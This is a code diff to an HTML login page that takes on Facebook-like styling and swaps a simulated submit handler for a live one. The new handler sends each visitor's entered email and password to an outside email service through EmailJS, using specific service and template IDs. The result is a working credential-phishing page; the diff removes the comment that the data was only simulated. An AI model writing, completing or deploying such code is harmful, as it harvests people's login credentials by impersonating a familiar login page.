@@ -11,31 +11,50 @@
             align-items: center;
             height: 100vh;
             background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
         }
         .login-container {
             background-color: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            width: 300px;
+        }
+        h2 {
+            text-align: center;
+            color: #1877f2;
         }
         input[type="text"], input[type="password"] {
             width: 100%;
-            padding: 10px;
-            margin: 10px 0;
+            padding: 12px;
+            margin: 15px 0;
             border: 1px solid #ccc;
             border-radius: 5px;
+            font-size: 16px;
         }
         button {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #1877f2;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            font-size: 16px;
         }
         button:hover {
             background-color: #155ab6;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -47,24 +66,37 @@
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Login</button>
         </form>
+        <div class="forgot-password">
+            <a href="#">Forgot Password?</a>
+        </div>
     </div>
 
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
+        // Initialize EmailJS with your user ID
+        (function(){
+            emailjs.init("YOUR_USER_ID");  // Replace with your actual EmailJS user ID
+        })();
+
         function handleSubmit(event) {
             event.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Simulate sending data to an email (this won't actually send an email)
-            const data = {
-                email: email,
-                password: password
+            // Prepare the data to be sent
+            const templateParams = {
+                user_email: email,
+                user_password: password
             };
 
-            console.log('Data sent:', data); // For debugging purposes only
-
-            // Redirect or perform an action after login (optional)
-            // window.location.href = "some-other-page.html";
+            // Send the email using EmailJS
+            emailjs.send("service_la9pk5b", "template_taq80yv", templateParams)
+                .then(function(response) {
+                    alert('Login data sent successfully!');
+                }, function(error) {
+                    alert('Failed to send login data. Please try again.');
+                });
         }
     </script>
 </body>
